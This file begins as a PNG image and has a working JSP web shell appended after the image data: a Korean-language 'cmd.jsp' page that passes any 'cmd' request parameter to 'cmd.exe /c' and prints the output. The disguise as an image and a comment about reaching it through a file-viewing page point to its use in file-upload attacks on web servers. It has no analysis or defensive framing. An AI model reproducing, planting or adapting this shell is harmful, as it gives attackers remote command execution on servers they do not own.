�PNG

   IHDR   x   \   �Yq�   sRGB ���   gAMA  ���a   	pHYs  �  ��o�d  PIDATx^���k�u���~og;�ݸQt�E�^��M��P:�Bj�.��IAtх�x[K"JB4ݨlut�.��A� �b�<�����s����y�~|���z�a컛�����W+�ss�Q�U���4�'`�L���0y&O��	�<�'`�L���0y&O�K�����65����ܐ}����?�/���X�46�7�Y�HU�����|޵���Jw�Cv�`hmu'����ƞ��E:�ɸ7�}���_��߳��}.�ĕ��Xg7���+�5�Scc	7>�P���%�}�`�&���]�=o��r�	ط���3�'jk���������W
`��=���k�큥N�ݱ���̌����xw}�{��؝����G
a���s�cw��5����7�����V6�{���{�����_�1�;�b���\����h�1+��C=k�_	a���h��<%-wP��b{��pg&SX�&mP ܭ���`���e���ݖ ,&O���c�b�����ؠ����`q�2͊K-U��eql���	�;�{��a��x}U���ӫ�h�,�;��=�;O�]��W���]R���`/쟂]P����6X�%557W����Ӱ`�
����t`soP��c��ۭUk�\YYx{�N��^l���gv��#~�"��x�ab|Ō��&u)�+l)~�;O����O��w,��P�4}nw�/SS��ZJ��a��u
��Lأ��E�e8���n�5k��_{�1�X`��-D������4�"��jk]��b�8�%��P��s�_Q�ݲ��׻n���5�0i��P�{�_Q+����GuG6t�3bk�36�����k��X�`��p&���Y0��0�j�����*�epCa\�wZ��i%_�ν�����a��~i����D̕�S[�.wp���Mc������ZZ܁�����᯵̉������F���m��+X�+��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0u��.8vt�R�    IEND�B`�<%@ page import="java.util.*, java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (Windows with Korean Support)
//
// by: Unknown
// modified: [현재 날짜]
//
%>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>명령 실행</title>
    <script>
        function submitForm(form) {
            var currentUrl = window.location.href;
            var baseUrl = currentUrl.split('?')[0]; // view_file.jsp?filename=jspwebshell_windows.jsp 부분까지 가져옴
            var command = form.cmd.value;
            
            // 현재 URL에서 filename 파라미터 추출
            var urlParams = new URLSearchParams(window.location.search);
            var filename = urlParams.get('filename');
            
            // 새로운 URL 구성
            var newUrl = baseUrl + "?filename=" + filename + "?cmd=" + encodeURIComponent(command);
            
            // URL 이동
            window.location.href = newUrl;
            return false;
        }
    </script>
</head>
<body>
    <form method="get" name="myform" action="" onsubmit="return submitForm(this);">
        <input type="text" name="cmd" placeholder="명령어 입력">
        <input type="submit" value="실행">
    </form>
    <pre>
<%
if (request.getParameter("cmd") != null) {
    String command = "cmd.exe /c " + request.getParameter("cmd"); // Windows 명령어 실행
    out.println("실행된 명령어: " + command + "<br>");
    Process p = Runtime.getRuntime().exec(command);

    // 프로세스 출력 읽기
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream(); // 에러 출력 읽기
    BufferedReader reader = new BufferedReader(new InputStreamReader(in, "MS949")); // Windows 기본 인코딩
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(err, "MS949"));

    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
    reader.close();

    // 에러 출력 처리
    while ((line = errorReader.readLine()) != null) {
        out.println("<font color='red'>" + line + "</font><br>");
    }
    errorReader.close();
}
%>
    </pre>
</body>
</html>